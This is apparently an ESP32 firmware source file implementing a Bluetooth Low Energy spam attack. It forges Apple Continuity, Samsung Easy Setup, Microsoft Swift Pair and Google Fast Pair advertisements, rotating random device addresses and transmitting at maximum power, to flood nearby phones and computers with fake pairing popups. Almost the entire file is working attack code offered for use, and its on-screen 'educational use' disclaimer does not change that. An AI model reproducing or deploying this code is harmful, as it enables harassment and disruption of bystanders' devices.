#include "BLESpam.h"
#include "DisplayTFT.h"
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <esp_bt.h>
#include <esp_gap_ble_api.h>
#include <esp_system.h>
#include "Input.h"
#include "PepeDraw.h"
#include "Pins.h"
#include "SoundUtils.h"
#include "BtUi.h"

extern DisplayTFT tft;

// ═══════════════════════════════════════════════════════════════════════════
//  TIPOS DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════
enum SpamMode {
    SPAM_APPLE     = 0,
    SPAM_SAMSUNG   = 1,
    SPAM_MICROSOFT = 2,
    SPAM_GOOGLE    = 3,
    SPAM_CHAOS     = 4
};

static const char* MODE_NAMES[] = {
    "Apple (iOS popups)",
    "Samsung (Android)",
    "Microsoft Swift Pair",
    "Google Fast Pair",
    "CHAOS MODE (all)"
};
static const int MODE_COUNT = 5;

// ═══════════════════════════════════════════════════════════════════════════
//  APPLE CONTINUITY · modelos de producto y sus nombres legibles
//  Format: sub-type 0x07 (pairing) + length + flags + product_id (2B) + etc
// ═══════════════════════════════════════════════════════════════════════════
struct AppleModel {
    uint8_t     product[2];
    const char* name;
};

static const AppleModel APPLE_MODELS[] = {
    {{0x0E, 0x20}, "AirPods Pro"},
    {{0x0A, 0x20}, "AirPods"},
    {{0x0B, 0x20}, "AirPods Max"},
    {{0x05, 0x20}, "AirPods 2nd gen"},
    {{0x13, 0x20}, "AirPods 3rd gen"},
    {{0x14, 0x20}, "AirPods Pro 2nd"},
    {{0x01, 0x20}, "AirPods 1st gen"},
    {{0x06, 0x20}, "Beats Solo 3"},
    {{0x09, 0x20}, "BeatsX"},
    {{0x0C, 0x20}, "Beats Flex"},
    {{0x11, 0x20}, "Beats Studio Pro"},
    {{0x16, 0x20}, "Powerbeats Pro"},
    {{0x17, 0x20}, "Beats Fit Pro"}
};
static const int APPLE_COUNT = sizeof(APPLE_MODELS) / sizeof(AppleModel);

// ═══════════════════════════════════════════════════════════════════════════
//  SAMSUNG EASY SETUP · Galaxy Buds series
// ═══════════════════════════════════════════════════════════════════════════
struct SamsungModel {
    uint32_t    id;
    const char* name;
};

static const SamsungModel SAMSUNG_MODELS[] = {
    {0xEE7A0C, "Galaxy Buds Live"},
    {0x9D1700, "Galaxy Buds+"},
    {0x39EA48, "Galaxy Buds 2"},
    {0xA7C62C, "Galaxy Buds 2 Pro"},
    {0x850116, "Galaxy Buds Pro"},
    {0x3D8F41, "Galaxy Buds"},
    {0x3B6D02, "Galaxy Buds FE"}
};
static const int SAMSUNG_COUNT = sizeof(SAMSUNG_MODELS) / sizeof(SamsungModel);

// ═══════════════════════════════════════════════════════════════════════════
//  MICROSOFT SWIFT PAIR
// ═══════════════════════════════════════════════════════════════════════════
static const char* MS_NAMES[] = {
    "Surface Keyboard",
    "Surface Mouse",
    "Surface Headphones",
    "Xbox Controller",
    "Surface Pen"
};
static const int MS_COUNT = sizeof(MS_NAMES) / sizeof(char*);

// ═══════════════════════════════════════════════════════════════════════════
//  GOOGLE FAST PAIR · service data format
// ═══════════════════════════════════════════════════════════════════════════
struct GoogleModel {
    uint8_t     id[3];
    const char* name;
};

static const GoogleModel GOOGLE_MODELS[] = {
    {{0xCD, 0x82, 0x56}, "Pixel Buds"},
    {{0x00, 0x00, 0x47}, "Pixel Buds A"},
    {{0xF5, 0x2E, 0x41}, "Bose NC 700"},
    {{0x0E, 0x0B, 0x09}, "JBL Live 650"},
    {{0x14, 0x00, 0x45}, "Sony WH-1000XM4"},
    {{0x00, 0x00, 0x44}, "Nest Device"}
};
static const int GOOGLE_COUNT = sizeof(GOOGLE_MODELS) / sizeof(GoogleModel);

// ═══════════════════════════════════════════════════════════════════════════
//  ESTADO
// ═══════════════════════════════════════════════════════════════════════════
static volatile unsigned long packetsSent = 0;
static String  currentDeviceName = "";
static SpamMode activeMode = SPAM_APPLE;

// BLEAdvertising de Arduino-ESP32 2.0.11 configura GAP de forma asíncrona.
// Estas banderas impiden iniciar/detener una transmisión antes de que el
// controlador confirme la operación anterior.
static volatile bool spamAdvDataDone = false;
static volatile bool spamAdvDataOk = false;
static volatile bool spamAdvStartDone = false;
static volatile bool spamAdvStartOk = false;
static volatile bool spamAdvStopDone = false;
static volatile bool spamRandAddrDone = false;
static volatile bool spamRandAddrOk = false;

static void bleSpamGapEvent(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t* param) {
    switch (event) {
        case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
            spamAdvDataOk = param->adv_data_raw_cmpl.status == ESP_BT_STATUS_SUCCESS;
            spamAdvDataDone = true;
            break;
        case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
            spamAdvStartOk = param->adv_start_cmpl.status == ESP_BT_STATUS_SUCCESS;
            spamAdvStartDone = true;
            break;
        case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
            spamAdvStopDone = true;
            break;
        case ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT:
            spamRandAddrOk = param->set_rand_addr_cmpl.status == ESP_BT_STATUS_SUCCESS;
            spamRandAddrDone = true;
            break;
        default:
            break;
    }
}

static bool waitBleSpamEvent(volatile bool& flag, uint32_t timeoutMs) {
    const uint32_t started = millis();
    while (!flag && millis() - started < timeoutMs) delay(1);
    return flag;
}

static bool rotateBleSpamAddress(BLEAdvertising* adv) {
    esp_bd_addr_t address;
    esp_fill_random(address, sizeof(address));

    // Convención usada por SourApple/nRFBox con Bluedroid: dirección Random
    // Static válida y una identidad nueva para cada advertising.
    address[0] |= 0xF0;
    spamRandAddrDone = false;
    spamRandAddrOk = false;
    adv->setDeviceAddress(address, BLE_ADDR_TYPE_RANDOM);
    return waitBleSpamEvent(spamRandAddrDone, 120) && spamRandAddrOk;
}

static void prepareBleSpamDisplay() {
    pinMode(TFT_CS_PIN, OUTPUT);
    pinMode(NRF1_CSN_PIN, OUTPUT);
#if NRF2_ENABLED
    pinMode(NRF2_CSN_PIN, OUTPUT);
#endif
    pinMode(NRF1_CE_PIN, OUTPUT);
#if NRF2_ENABLED
    pinMode(NRF2_CE_PIN, OUTPUT);
#endif

    digitalWrite(NRF1_CE_PIN, LOW);
#if NRF2_ENABLED
    digitalWrite(NRF2_CE_PIN, LOW);
#endif
    digitalWrite(NRF1_CSN_PIN, HIGH);
#if NRF2_ENABLED
    digitalWrite(NRF2_CSN_PIN, HIGH);
#endif
    digitalWrite(TFT_CS_PIN, HIGH);
    delayMicroseconds(80);
}

static void clearBleSpamScreen() {
    prepareBleSpamDisplay();
    tft.fillScreen(TFT_BLACK);
    delay(12);
    tft.fillRect(0, 0, 320, 240, TFT_BLACK);
}

// ═══════════════════════════════════════════════════════════════════════════
//  EMISIÓN DE UN PAQUETE (genera advertisement según el modo)
// ═══════════════════════════════════════════════════════════════════════════
static void sendAppleActionPacket(BLEAdvertising* adv) {
    static const uint8_t actionTypes[] = {
        0x27, 0x09, 0x02, 0x1E, 0x2B, 0x2D,
        0x2F, 0x01, 0x06, 0x20, 0xC0
    };
    static const char* actionNames[] = {
        "Apple TV Setup", "Apple TV Pair", "New Phone",
        "Apple TV Home", "Apple TV Keyboard", "Apple TV Connect",
        "Apple TV Audio", "Apple Device", "Apple Pairing",
        "Apple Setup", "Apple Action"
    };

    const int action = random(0, sizeof(actionTypes));
    currentDeviceName = actionNames[action];

    // Apple Continuity Nearby Action, tomado del SourApple funcional de
    // nRFBox. Este formato dispara acciones de proximidad en lugar de anunciar
    // solamente un accesorio ProximityPair.
    uint8_t packet[17];
    int p = 0;
    packet[p++] = 0x10;       // 16 bytes después del campo length
    packet[p++] = 0xFF;       // Manufacturer Specific Data
    packet[p++] = 0x4C;
    packet[p++] = 0x00;       // Apple company ID
    packet[p++] = 0x0F;       // Continuity Nearby Action
    packet[p++] = 0x05;
    packet[p++] = 0xC1;       // Action Flags
    packet[p++] = actionTypes[action];
    esp_fill_random(&packet[p], 3); // Authentication Tag
    p += 3;
    packet[p++] = 0x00;
    packet[p++] = 0x00;
    packet[p++] = 0x10;
    esp_fill_random(&packet[p], 3);
    p += 3;

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, p));
    adv->setAdvertisementData(advData);
}

static void sendAppleProximityPacket(BLEAdvertising* adv) {
    const int idx = random(0, APPLE_COUNT);
    const AppleModel& model = APPLE_MODELS[idx];
    currentDeviceName = "PAIR: " + String(model.name);

    // Apple Continuity ProximityPair usado por el BLESpam del firmware ESP32
    // Tools Pro. Complementa Nearby Action con anuncios AirPods/Beats.
    uint8_t packet[31] = {
        0x1E, 0xFF,             // length, Manufacturer Specific Data
        0x4C, 0x00,             // Apple company ID
        0x07, 0x19,             // Continuity ProximityPair, payload length
        0x01,                   // "not your device" / pairing prefix
        model.product[0], model.product[1],
        0x55                    // status
    };
    esp_fill_random(&packet[10], 21);

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    adv->setAdvertisementData(advData);
}

static void sendApplePacket(BLEAdvertising* adv) {
    // Alternar en vez de elegir al azar garantiza que las dos familias salgan
    // continuamente: Nearby Action (SourApple) y accesorios ProximityPair.
    static bool sendActionNext = true;
    if (sendActionNext) {
        sendAppleActionPacket(adv);
    } else {
        sendAppleProximityPacket(adv);
    }
    sendActionNext = !sendActionNext;
}

static void sendSamsungPacket(BLEAdvertising* adv) {
    int idx = random(0, SAMSUNG_COUNT);
    const SamsungModel& m = SAMSUNG_MODELS[idx];
    currentDeviceName = String(m.name);

    // Samsung Easy Setup / Galaxy Buds. Este formato ocupa los 31 bytes del
    // advertising legacy, incluido el segundo registro truncado que reconoce
    // el escáner de Samsung.
    uint8_t packet[31];
    int p = 0;
    packet[p++] = 0x1B; packet[p++] = 0xFF;
    packet[p++] = 0x75; packet[p++] = 0x00;
    packet[p++] = 0x42; packet[p++] = 0x09; packet[p++] = 0x81;
    packet[p++] = 0x02; packet[p++] = 0x14; packet[p++] = 0x15;
    packet[p++] = 0x03; packet[p++] = 0x21; packet[p++] = 0x01;
    packet[p++] = 0x09;
    packet[p++] = (m.id >> 16) & 0xFF;
    packet[p++] = (m.id >> 8) & 0xFF;
    packet[p++] = 0x01;
    packet[p++] = m.id & 0xFF;
    packet[p++] = 0x06; packet[p++] = 0x3C; packet[p++] = 0x94;
    packet[p++] = 0x8E; packet[p++] = 0x00; packet[p++] = 0x00;
    packet[p++] = 0x00; packet[p++] = 0x00; packet[p++] = 0xC7;
    packet[p++] = 0x00;
    packet[p++] = 0x10; packet[p++] = 0xFF; packet[p++] = 0x75;

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, p));
    adv->setAdvertisementData(advData);
}

static void sendMicrosoftPacket(BLEAdvertising* adv) {
    int idx = random(0, MS_COUNT);
    currentDeviceName = String(MS_NAMES[idx]);

    // Microsoft Swift Pair: manufacturer record de 10 bytes seguido por el
    // Complete Local Name. La versión anterior declaraba longitudes distintas
    // a los bytes enviados y los receptores descartaban el advertisement.
    uint8_t nameLen = strlen(MS_NAMES[idx]);
    if (nameLen > 19) nameLen = 19;

    uint8_t packet[31];
    int p = 0;
    packet[p++] = 0x09;       // 9 bytes follow this length byte
    packet[p++] = 0xFF;       // Manufacturer Specific Data
    packet[p++] = 0x06; packet[p++] = 0x00; // Microsoft vendor ID
    packet[p++] = 0x03;       // Swift Pair sub-scenario
    packet[p++] = 0x02;       // discoverable + name present
    packet[p++] = 0x80;       // reserved RSSI byte
    const uint32_t classOfDevice = 0x240418; // wearable headset/audio
    packet[p++] = classOfDevice & 0xFF;
    packet[p++] = (classOfDevice >> 8) & 0xFF;
    packet[p++] = (classOfDevice >> 16) & 0xFF;
    packet[p++] = nameLen + 1;
    packet[p++] = 0x09;       // Complete Local Name
    memcpy(&packet[p], MS_NAMES[idx], nameLen);
    p += nameLen;

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, p));
    adv->setAdvertisementData(advData);
}

static void sendGooglePacket(BLEAdvertising* adv) {
    int idx = random(0, GOOGLE_COUNT);
    const GoogleModel& m = GOOGLE_MODELS[idx];
    currentDeviceName = String(m.name);

    // Google Fast Pair service data (UUID 0xFE2C). Son dos registros AD y un
    // Tx Power; no se anteponen Flags porque excedería/invalidaría este layout.
    uint8_t packet[14] = {
        0x03, 0x03, 0x2C, 0xFE,       // service UUID 0xFE2C (Fast Pair)
        0x06, 0x16, 0x2C, 0xFE,       // service data header
        m.id[0], m.id[1], m.id[2],    // model ID
        0x02, 0x0A,                   // Tx Power AD record
        (uint8_t)random(-80, -25)
    };

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    adv->setAdvertisementData(advData);
}

// Dispatcher que emite un paquete según el modo (para CHAOS rota aleatorio)
static void sendSpamPacket(BLEAdvertising* adv, SpamMode mode) {
    SpamMode effective = mode;
    if (mode == SPAM_CHAOS) {
        effective = (SpamMode)random(0, 4);  // sortea entre los 4 reales
    }

    switch (effective) {
        case SPAM_APPLE:     sendApplePacket(adv);     break;
        case SPAM_SAMSUNG:   sendSamsungPacket(adv);   break;
        case SPAM_MICROSOFT: sendMicrosoftPacket(adv); break;
        case SPAM_GOOGLE:    sendGooglePacket(adv);    break;
        default: break;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  DISCLAIMER INICIAL
// ═══════════════════════════════════════════════════════════════════════════
static bool showDisclaimer() {
    clearBleSpamScreen();
    btUiFrame("BLE ADVERTISING", "AUTHORIZED", BT_UI_DANGER);
    btUiCard(12, 49, 296, 151, false, BT_UI_DANGER);

    int y = 60;
    drawStringCentered(y,       "This tool sends fake BLE",            UI_MAIN, 1, FONT_SMALL);
    y += 12;
    drawStringCentered(y,       "advertisements to trigger",            UI_MAIN, 1, FONT_SMALL);
    y += 12;
    drawStringCentered(y,       "pairing popups on nearby devices.",    UI_MAIN, 1, FONT_SMALL);
    y += 20;

    drawStringCentered(y,       "DO NOT USE IN HOSPITALS,",             UI_ACCENT, 1, FONT_SMALL);
    y += 12;
    drawStringCentered(y,       "AIRCRAFT OR PUBLIC TRANSIT",           UI_ACCENT, 1, FONT_SMALL);
    y += 12;
    drawStringCentered(y,       "MAY BE ILLEGAL IN SOME REGIONS",       UI_ACCENT, 1, FONT_SMALL);
    y += 12;
    drawStringCentered(y,       "EDUCATIONAL / DEMO USE ONLY",          UI_ACCENT, 1, FONT_SMALL);
    y += 20;

    drawStringCentered(y,       "YOU ARE RESPONSIBLE FOR YOUR USE",     UI_MAIN, 1, FONT_SMALL);

    btUiFooter("OK: ACCEPT", "BACK: CANCEL", BT_UI_DANGER);

    // Esperar respuesta
    while (true) {
        if (isEnterPressed()) {
            beep(2200, 60);
            while (isEnterPressed() || isBackPressed()) delay(5);
            flushNavInput(80);
            return true;
        }
        if (isBackPressed() || digitalRead(BTN_UP) == LOW ||
            digitalRead(BTN_DOWN) == LOW) {
            beep(1000, 80);
            while (isBackPressed() || digitalRead(BTN_UP) == LOW ||
                   digitalRead(BTN_DOWN) == LOW) delay(5);
            flushNavInput(80);
            return false;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  MENÚ DE SELECCIÓN DE MODO
// ═══════════════════════════════════════════════════════════════════════════
static void drawModeMenuRow(int idx, bool selected) {
    int y = 48 + idx * 30;
    uint16_t bg = selected ? BT_UI_ACCENT : BT_UI_PANEL;
    uint16_t fg = selected ? BT_UI_BG : BT_UI_TEXT;

    tft.fillRoundRect(10, y, 300, 26, 5, bg);
    tft.drawRoundRect(10, y, 300, 26, 5, BT_UI_ACCENT);
    drawStringCustom(20, y + 7, MODE_NAMES[idx], fg, 2);
}

static void drawModeMenu(int cursor) {
    clearBleSpamScreen();
    btUiFrame("BLE ADVERTISING", "5 MODES", BT_UI_GLOW);

    for (int i = 0; i < MODE_COUNT; i++) {
        drawModeMenuRow(i, i == cursor);
    }

    // Footer
    btUiFooter("UP/DN: MODE", "OK: START", BT_UI_ACCENT);
}

// Devuelve -1 si el usuario cancela; si no, el modo elegido (0..4)
static int selectMode() {
    int cursor = 0;
    drawModeMenu(cursor);

    while (true) {
        NavAction action = readNavAction(110);
        if (action == NAV_BACK) {
            beep(1000, 50);
            while (isBackPressed()) delay(5);
            flushNavInput(80);
            return -1;
        }
        if (action == NAV_UP) {
            int oldCursor = cursor;
            cursor = (cursor - 1 + MODE_COUNT) % MODE_COUNT;
            beep(2100, 20);
            tft.startWrite();
            drawModeMenuRow(oldCursor, false);
            drawModeMenuRow(cursor, true);
            tft.endWrite();
        }
        if (action == NAV_DOWN) {
            int oldCursor = cursor;
            cursor = (cursor + 1) % MODE_COUNT;
            beep(2100, 20);
            tft.startWrite();
            drawModeMenuRow(oldCursor, false);
            drawModeMenuRow(cursor, true);
            tft.endWrite();
        }
        if (action == NAV_ENTER) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 50);
            flushNavInput(80);
            if (held) return -1;
            return cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  PANTALLA DE ATAQUE ACTIVO
// ═══════════════════════════════════════════════════════════════════════════
static void drawAttackFrame(SpamMode mode) {
    clearBleSpamScreen();

    // Header con título del modo
    String title = "SPAM: ";
    switch (mode) {
        case SPAM_APPLE:     title += "APPLE";       break;
        case SPAM_SAMSUNG:   title += "SAMSUNG";     break;
        case SPAM_MICROSOFT: title += "MICROSOFT";   break;
        case SPAM_GOOGLE:    title += "GOOGLE";      break;
        case SPAM_CHAOS:     title += "CHAOS";       break;
    }

    btUiFrame(title, "ACTIVE", BT_UI_DANGER);

    btUiMetric(10, 51, 96, "PACKETS", "0", BT_UI_OK);
    btUiMetric(112, 51, 198, "CURRENT DEVICE", "--", BT_UI_GLOW);
    btUiMetric(10, 101, 300, "ADVERTISING RATE", "0 pkt/s", BT_UI_ACCENT);
    btUiCard(10, 151, 300, 48, false, BT_UI_DANGER);

    btUiFooter("BLE TX ACTIVE", "HOLD/BACK: STOP", BT_UI_DANGER);
}

static void drawAttackStats(unsigned long pkts, float rate) {
    tft.fillRect(18, 70, 80, 17, BT_UI_PANEL);
    drawStringCustom(18, 72, String(pkts), BT_UI_OK, 2);

    String cd = currentDeviceName;
    tft.fillRect(120, 70, 182, 17, BT_UI_PANEL);
    drawStringFit(120, 72, cd, BT_UI_GLOW, 178, 1);

    char rateBuf[24];
    snprintf(rateBuf, sizeof(rateBuf), "%d pkt/sec", (int)rate);
    tft.fillRect(18, 120, 282, 17, BT_UI_PANEL);
    drawStringCustom(18, 122, rateBuf, BT_UI_ACCENT, 2);

    tft.fillRect(18, 163, 284, 24, BT_UI_PANEL);
    int fillW = 10 + (int)(random(50, 290));
    tft.fillRoundRect(18, 170, fillW - 12, 9, 4, BT_UI_DANGER);
}

// ═══════════════════════════════════════════════════════════════════════════
//  MAIN
// ═══════════════════════════════════════════════════════════════════════════
void runBLESpam() {

    // Esperar liberación de OK
    while (isEnterPressed() || isBackPressed()) delay(5);
    flushNavInput(100);
    prepareBleSpamDisplay();

    // Disclaimer
    if (!showDisclaimer()) {
        clearBleSpamScreen();
        // Usuario canceló
        return;
    }

    // Loop de menú (se puede entrar/salir de varios modos sin reiniciar BLE)
    while (true) {
        int choice = selectMode();
        if (choice < 0) break;   // BACK

        activeMode = (SpamMode)choice;

        // ── Inicializar BLE para TX ────────────────────────────────────
        // Stack y servidor nuevos para cada ejecución, como SourApple.
        BLEDevice::init("");
        delay(100);
        BLEDevice::setCustomGapHandler(bleSpamGapEvent);
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
        BLEServer* server = BLEDevice::createServer();
        BLEAdvertising* adv = server->getAdvertising();
        // SourApple utiliza el tipo connectable predeterminado. Algunos
        // receptores ignoran los Nearby Action si se anuncian como NONCONN.
        adv->setAdvertisementType(ADV_TYPE_IND);
        adv->setScanResponse(false);

        // Parámetros comprobados por SourApple/nRFBox.
        adv->setMinInterval(0x20);   // 20 ms
        adv->setMaxInterval(0x20);   // 20 ms
        adv->setMinPreferred(0x20);
        adv->setMaxPreferred(0x20);

        // Instalar una dirección inicial válida antes del primer start.
        esp_bd_addr_t initialAddress = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
        spamRandAddrDone = false;
        spamRandAddrOk = false;
        adv->setDeviceAddress(initialAddress, BLE_ADDR_TYPE_RANDOM);
        waitBleSpamEvent(spamRandAddrDone, 120);

        // ── Pantalla de ataque ──────────────────────────────────────────
        drawAttackFrame(activeMode);
        beep(2400, 40); delay(20);
        beep(3000, 60);

        packetsSent = 0;
        unsigned long lastStatsUpdate = millis();
        unsigned long lastPacket = 0;
        unsigned long lastPktCount = 0;
        float currentRate = 0;

        bool stopAttack = false;
        bool advRunning = false;
        unsigned long okPressStart = 0;
        bool okHeld = false;

        while (!stopAttack) {
            // Cada operación GAP es asíncrona. Esperar sus confirmaciones evita
            // el ciclo stop/config/start solapado que dejaba la pantalla activa
            // aunque la radio realmente hubiera rechazado el advertising.
            if (millis() - lastPacket >= 40) {
                if (advRunning) {
                    spamAdvStopDone = false;
                    adv->stop();
                    waitBleSpamEvent(spamAdvStopDone, 120);
                    advRunning = false;
                }

                // SourApple cambia la identidad antes de construir cada
                // advertisement. Si una rotación aislada falla, se conserva la
                // dirección válida anterior y se continúa transmitiendo.
                rotateBleSpamAddress(adv);

                spamAdvDataDone = false;
                spamAdvDataOk = false;
                sendSpamPacket(adv, activeMode);
                const bool dataReady = waitBleSpamEvent(spamAdvDataDone, 120) && spamAdvDataOk;

                if (dataReady) {
                    spamAdvStartDone = false;
                    spamAdvStartOk = false;
                    adv->start();
                    if (waitBleSpamEvent(spamAdvStartDone, 120) && spamAdvStartOk) {
                        advRunning = true;
                        packetsSent++;
                    }
                }
                lastPacket = millis();
            }

            // Update stats UI cada 250 ms
            if (millis() - lastStatsUpdate > 250) {
                unsigned long elapsed = millis() - lastStatsUpdate;
                unsigned long delta = packetsSent - lastPktCount;
                currentRate = (delta * 1000.0f) / elapsed;
                lastPktCount = packetsSent;
                drawAttackStats(packetsSent, currentRate);
                lastStatsUpdate = millis();
            }

            // BACK o OK HOLD para parar
            if (isBackPressed()) {
                stopAttack = true;
                while (isBackPressed()) delay(5);
                flushNavInput(80);
            } else if (isEnterPressed()) {
                if (!okHeld) {
                    okPressStart = millis();
                    okHeld = true;
                } else if (millis() - okPressStart > 500) {
                    stopAttack = true;
                }
            } else {
                okHeld = false;
            }

            delay(5);
        }

        // ── Parar BLE ───────────────────────────────────────────────────
        if (advRunning) {
            spamAdvStopDone = false;
            adv->stop();
            waitBleSpamEvent(spamAdvStopDone, 120);
        }
        BLEDevice::setCustomGapHandler(nullptr);
        BLEDevice::deinit(false);

        beep(1800, 40); delay(20);
        beep(1200, 60);

        // Esperar liberación OK
        while (isEnterPressed() || isBackPressed()) delay(5);
        clearBleSpamScreen();
        flushNavInput(120);

        // Volver al menú de selección de modo (loop)
    }

    // Sale al submenú padre
}
